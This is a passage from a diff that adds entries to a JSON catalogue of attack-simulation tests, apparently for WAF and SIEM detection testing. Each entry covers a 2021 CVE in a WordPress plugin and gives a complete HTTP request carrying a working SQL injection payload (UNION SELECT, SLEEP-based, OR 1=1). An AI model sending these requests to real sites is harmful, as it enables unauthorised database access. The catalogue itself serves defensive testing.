+    "displayName": "CVE-2021-24395 - Embed Youtube Video WordPress Plugin SQL Injection",
+    "description": "The Embed Youtube Video WordPress plugin through 1.0 is vulnerable to authenticated SQL injection: the editid GET parameter on /wp-admin/admin.php?page=embed-youtube-video-add is used unsanitised in a SQL statement. The request sends a UNION SELECT payload in editid. No vendor WAF rule found; built from the WPScan advisory PoC. Admin session cookie is a dummy value.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/6cd9ebcf-e78f-4f97-a8f9-b7e4ceab66b7 (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-embed-youtube-video/ (disclosure)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=embed-youtube-video-add&editid=-6425%20UNION%20ALL%20SELECT%20NULL,user(),NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24395"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24395",
+        "link": "https://wpscan.com/vulnerability/6cd9ebcf-e78f-4f97-a8f9-b7e4ceab66b7"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24394 - Easy Testimonial Manager WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24394 - Easy Testimonial Manager WordPress Plugin SQL Injection",
+    "description": "The Easy Testimonial Manager WordPress plugin through 1.2.0 is vulnerable to authenticated SQL injection: the id GET parameter on /wp-admin/admin.php?page=easy_testimonial_update is used unsanitised in a SQL statement. The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the WPScan advisory PoC (the advisory request line has a duplicated page=...&id= prefix which was corrected). Admin session cookie is a dummy value.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/e0bc9251-cccc-4416-91b2-8395d89d8fb3 (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-easy-testimonial-manager/ (disclosure)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=easy_testimonial_update&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,user(),NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24394"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24394",
+        "link": "https://wpscan.com/vulnerability/e0bc9251-cccc-4416-91b2-8395d89d8fb3"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24393 - Comment Highlighter WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24393 - Comment Highlighter WordPress Plugin SQL Injection",
+    "description": "The Comment Highlighter WordPress plugin through 0.13 is vulnerable to authenticated SQL injection: the c GET parameter on /wp-admin/options-general.php?page=comment-highlighter/comment_highlighter.php is used unsanitised in a SQL statement. The request sends a UNION SELECT payload in c. No vendor WAF rule found; built from the WPScan advisory PoC. Admin session cookie is a dummy value.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/24969766-19e3-47cd-b32c-6c3330651d1f (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-comment-highlighter/ (disclosure)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/options-general.php?page=comment-highlighter/comment_highlighter.php&c=-6104%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,user(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24393"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24393",
+        "link": "https://wpscan.com/vulnerability/24969766-19e3-47cd-b32c-6c3330651d1f"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24392 - WordPress Membership SwiftCloud.io Plugin SQL Injection",
+    "displayName": "CVE-2021-24392 - WordPress Membership SwiftCloud.io Plugin SQL Injection",
+    "description": "The WordPress Membership SwiftCloud.io (club-management-software) plugin through 1.0 is vulnerable to authenticated SQL injection: the id GET parameter on /wp-admin/admin.php?page=swiftbook_add_email_template is used unsanitised in a SQL statement. The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the WPScan advisory PoC. Admin session cookie is a dummy value.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/68530e63-bba3-4a9a-ae83-516684aa5dc6 (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-club-management-software/ (disclosure)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=swiftbook_add_email_template&id=0%20UNION%20ALL%20SELECT%20NULL,NULL,user(),NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24392"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24392",
+        "link": "https://wpscan.com/vulnerability/68530e63-bba3-4a9a-ae83-516684aa5dc6"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24391 - Cashtomer WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24391 - Cashtomer WordPress Plugin SQL Injection",
+    "description": "The Cashtomer WordPress plugin through 1.0.0 is vulnerable to authenticated SQL injection: the editid GET parameter on /wp-admin/admin.php?page=add-social-point (with id=facebookshare) is used unsanitised in a SQL statement. The request sends a UNION SELECT payload in editid. No vendor WAF rule found; built from the WPScan advisory PoC. Admin session cookie is a dummy value.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/0c26ee50-df3d-438a-93bb-faa88b7983af (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-cashtomer/ (disclosure)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=add-social-point&id=facebookshare&editid=-9677%20UNION%20ALL%20SELECT%20NULL,NULL,user(),NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24391"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24391",
+        "link": "https://wpscan.com/vulnerability/0c26ee50-df3d-438a-93bb-faa88b7983af"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24390 - WordPress Alipay/Tenpay/PayPal Integration Plugin SQL Injection",
+    "displayName": "CVE-2021-24390 - WordPress Alipay/Tenpay/PayPal Integration Plugin SQL Injection",
+    "description": "The WordPress Alipay/Tenpay/PayPal integration plugin (ws_alipay) through 3.7.2 is vulnerable to authenticated SQL injection: the proid GET parameter on /wp-admin/options-general.php?page=ws_alipay&action=edit is used unsanitised in a SQL statement that is not delimited by quotes. The request sends a UNION SELECT payload in proid. No vendor WAF rule found; built from the WPScan advisory PoC (column count trimmed). Admin session cookie is a dummy value.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/92b0abec-082f-4545-9636-1b2f4dac66fe (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-alipay/ (disclosure)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/options-general.php?page=ws_alipay&action=edit&proid=-5818%20UNION%20ALL%20SELECT%2073,73,73,73,73,user(),73,73,73,73%23 HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24390"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24390",
+        "link": "https://wpscan.com/vulnerability/92b0abec-082f-4545-9636-1b2f4dac66fe"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24385 - FileBird WordPress Media Library Plugin SQL Injection",
+    "displayName": "CVE-2021-24385 - FileBird WordPress Media Library Plugin SQL Injection",
+    "description": "The FileBird WordPress plugin 4.7.3 is vulnerable to unauthenticated SQL injection via the REST API route /wp-json/filebird/v1/gutenberg-get-images, which passes the selectedFolder JSON body value unescaped to get_col without any required authentication. The request sends a UNION SELECT payload in selectedFolder. Fixed in 4.7.4. No vendor WAF rule found; built from the WPScan advisory PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/754ac750-0262-4f65-b23e-d5523995fbfa (WPScan advisory + PoC)\n- https://10up.com/blog/2021/security-vulnerability-filebird-wordpress-plugin/ (write-up)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-json/filebird/v1/gutenberg-get-images?_locale=user HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/json\n\n{\"selectedFolder\":[\"1) UNION (SELECT user(),2,3 -- -\"]}\n"
+    },
+    "cves": [
+      "CVE-2021-24385"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24385",
+        "link": "https://wpscan.com/vulnerability/754ac750-0262-4f65-b23e-d5523995fbfa"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24361 - GeoDirectory Location Manager WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24361 - GeoDirectory Location Manager WordPress Plugin SQL Injection",
+    "description": "The GeoDirectory Location Manager WordPress plugin before 2.1.0.10 is vulnerable to unauthenticated SQL injection via the gd_popular_location_list AJAX action on /wp-admin/admin-ajax.php: POST parameters carried inside the scatts JSON value (e.g. order_by) are not sanitised before use in a SQL statement. The request sends a time-based (SLEEP(5)) payload in the order_by key. Nonce and session cookie are dummy values. No vendor WAF rule found; built from the WPScan advisory PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/5aff50fc-ac96-4076-a07c-bb145ae37025 (WPScan advisory + PoC)\n- https://wpgeodirectory.com/downloads/location-manager/ (vendor)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wpinv_session_dummy=dummy\n\naction=gd_popular_location_list&_nonce=dummy&scatts=%7B%22what%22%3A%22city%22%2C%22order_by%22%3A%221)%20OR%20SLEEP(5)--%20-%22%7D\n"
+    },
+    "cves": [
+      "CVE-2021-24361"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24361",
+        "link": "https://wpscan.com/vulnerability/5aff50fc-ac96-4076-a07c-bb145ae37025"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24221 - Quiz And Survey Master WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24221 - Quiz And Survey Master WordPress Plugin SQL Injection",
+    "description": "The Quiz And Survey Master plugin before 7.1.12 does not sanitise the result_id GET parameter on pages carrying the [qsm_result] shortcode (no id attribute), concatenating it into a SQL statement. The request sends a time-based SQL injection (0 or sleep(5)) in result_id. The path is the permalink of the page hosting the shortcode (page permalink inferred; param and GET method per advisory). No vendor WAF rule found; built from the WPScan advisory PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/3b52b25c-82a1-41c7-83ac-92e244f7c5ab (WPScan advisory, PoC)\n- https://plugins.trac.wordpress.org/changeset/2479603/ (fix changeset)\n- https://www.cve.org/CVERecord?id=CVE-2021-24221 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /?result_id=0%20or%20sleep(5) HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24221"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24221",
+        "link": "https://wpscan.com/vulnerability/3b52b25c-82a1-41c7-83ac-92e244f7c5ab"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24200 - wpDataTables WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24200 - wpDataTables WordPress Plugin SQL Injection",
+    "description": "The wpDataTables premium plugin before 3.4.2 is vulnerable to boolean-based blind SQL injection on the get_wdtable AJAX endpoint via the 'length' POST parameter. The request sends an OR 1=1 payload in the length parameter of /wp-admin/admin-ajax.php?action=get_wdtable&table_id=1. No vendor WAF rule found; built from the WPScan advisory and n4nj0 write-up.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/21aa7e18-0162-45bf-a5c6-ceee64ffa1f9 (WPScan advisory, PoC)\n- https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-ii/ (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2021-24200 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php?action=get_wdtable&table_id=1 HTTP/1.1\nHost: {{target_host}}\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\ndraw=1&start=0&length=1%20OR%201%3D1--%20-\n"
+    },
+    "cves": [
+      "CVE-2021-24200"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24200",
+        "link": "https://wpscan.com/vulnerability/21aa7e18-0162-45bf-a5c6-ceee64ffa1f9"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24199 - wpDataTables WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24199 - wpDataTables WordPress Plugin SQL Injection",
+    "description": "The wpDataTables premium plugin before 3.4.2 is vulnerable to boolean-based blind SQL injection on the get_wdtable AJAX endpoint via the 'start' POST parameter. The request sends an OR 1=1 payload in the start parameter of /wp-admin/admin-ajax.php?action=get_wdtable&table_id=1. No vendor WAF rule found; built from the WPScan advisory and n4nj0 write-up.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/5c98c2d6-d002-4cff-9d6f-633cb3ec6280 (WPScan advisory, PoC)\n- https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-ii/ (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2021-24199 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php?action=get_wdtable&table_id=1 HTTP/1.1\nHost: {{target_host}}\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\ndraw=1&start=0%20OR%201%3D1--%20-&length=10\n"
+    },
+    "cves": [
+      "CVE-2021-24199"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24199",
+        "link": "https://wpscan.com/vulnerability/5c98c2d6-d002-4cff-9d6f-633cb3ec6280"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24186 - Tutor LMS WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24186 - Tutor LMS WordPress Plugin SQL Injection",
+    "description": "Tutor LMS before 1.8.3 is vulnerable to UNION-based SQL injection via the tutor_answering_quiz_question action (tutor_action), in the attempt[1][quiz_question][1] POST parameter when submitting a quiz answer. The request posts a UNION SELECT payload to the quiz attempt endpoint. Path is the PoC sample quiz permalink. No vendor WAF rule found; built from the WPScan advisory PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/5f5c0c6c-6f76-4366-b590-0aab557f8c60 (WPScan advisory, PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24186 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /courses/first-class/tutor_quiz/test/ HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\n_wpnonce=dummy&attempt_id=1&tutor_action=tutor_answering_quiz_question&attempt%5B1%5D%5Bquiz_question%5D%5B1%5D=1%20UNION%20SELECT%201,2,3,version(),5,6,7,8,9,10,11,12,13--%20-&quiz_answer_submit_btn=quiz_answer_submit\n"
+    },
+    "cves": [
+      "CVE-2021-24186"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24186",
+        "link": "https://wpscan.com/vulnerability/5f5c0c6c-6f76-4366-b590-0aab557f8c60"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24185 - Tutor LMS WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24185 - Tutor LMS WordPress Plugin SQL Injection",
+    "description": "Tutor LMS before 1.7.7 is vulnerable to blind/time-based SQL injection via the tutor_place_rating AJAX action in the course_id POST parameter. The request sends a time-based (AND SLEEP(5)) payload in course_id to /wp-admin/admin-ajax.php. No vendor WAF rule found; built from the WPScan advisory PoC (sqlmap -p course_id).\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/0cba5349-e916-43f0-a1fe-62cf73e352a2 (WPScan advisory, PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24185 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\naction=tutor_place_rating&course_id=26%20AND%20SLEEP(5)&rating=5&review=test\n"
+    },
+    "cves": [
+      "CVE-2021-24185"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24185",
+        "link": "https://wpscan.com/vulnerability/0cba5349-e916-43f0-a1fe-62cf73e352a2"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24183 - Tutor LMS WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24183 - Tutor LMS WordPress Plugin SQL Injection",
+    "description": "Tutor LMS before 1.8.3 is vulnerable to UNION-based SQL injection via the tutor_quiz_builder_get_question_form AJAX action in the question_id POST parameter. The request sends a UNION SELECT payload in question_id to /wp-admin/admin-ajax.php. No vendor WAF rule found; built from the WPScan advisory PoC (sqlmap -p question_id).\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/9b8da6b7-f1d6-4a7d-a621-4ca01e4b7496 (WPScan advisory, PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24183 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\naction=tutor_quiz_builder_get_question_form&question_id=-1%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL--%20-&quiz_id=1\n"
+    },
+    "cves": [
+      "CVE-2021-24183"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24183",
+        "link": "https://wpscan.com/vulnerability/9b8da6b7-f1d6-4a7d-a621-4ca01e4b7496"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24182 - Tutor LMS WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24182 - Tutor LMS WordPress Plugin SQL Injection",
+    "description": "Tutor LMS before 1.8.3 is vulnerable to UNION-based SQL injection via the tutor_quiz_builder_get_answers_by_question AJAX action in the question_id POST parameter. The request sends a UNION SELECT payload in question_id to /wp-admin/admin-ajax.php. No vendor WAF rule found; built from the WPScan advisory PoC (sqlmap -p question_id).\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/f74dfc52-46ba-41e3-994b-23115a22984f (WPScan advisory, PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24182 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\naction=tutor_quiz_builder_get_answers_by_question&question_id=-1%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL--%20-&question_type=1\n"
+    },
+    "cves": [
+      "CVE-2021-24182"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24182",
+        "link": "https://wpscan.com/vulnerability/f74dfc52-46ba-41e3-994b-23115a22984f"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24181 - Tutor LMS WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24181 - Tutor LMS WordPress Plugin SQL Injection",
+    "description": "Tutor LMS before 1.7.7 is vulnerable to blind/time-based SQL injection via the tutor_mark_answer_as_correct AJAX action in the answer_id POST parameter. The request sends a time-based (AND SLEEP(5)) payload in answer_id to /wp-admin/admin-ajax.php. No vendor WAF rule found; built from the WPScan advisory PoC (sqlmap -p answer_id --technique=T).\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/d5a00322-7098-4f8d-8e5e-157b63449c17 (WPScan advisory, PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24181 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\naction=tutor_mark_answer_as_correct&answer_id=1%20AND%20SLEEP(5)&inputValue=1\n"
+    },
+    "cves": [
+      "CVE-2021-24181"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24181",
+        "link": "https://wpscan.com/vulnerability/d5a00322-7098-4f8d-8e5e-157b63449c17"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24151 - WP Editor WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24151 - WP Editor WordPress Plugin SQL Injection",
+    "description": "WP Editor before 1.2.7 does not sanitise/validate setting fields, leading to authenticated (admin+) blind SQL injection via an arbitrary parameter when saving settings. The injection sits in the POST parameter NAME (cm0s'/**/or/**/sleep(5)#). The admin-ajax.php path and POST method are inferred from the save_wpeditor_settings AJAX action (method/path inferred). No vendor WAF rule found; built from the WPScan advisory PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/5ee77dd7-5a73-4d4e-8038-23e6e763e20c/ (WPScan advisory, PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24151 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\nwp_editor_ajax_nonce_settings_main=dummy&action=save_wpeditor_settings&submit=Save%20Settings&cm0s'/**/or/**/sleep(5)%23=cm0s\n"
+    },
+    "cves": [
+      "CVE-2021-24151"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24151",
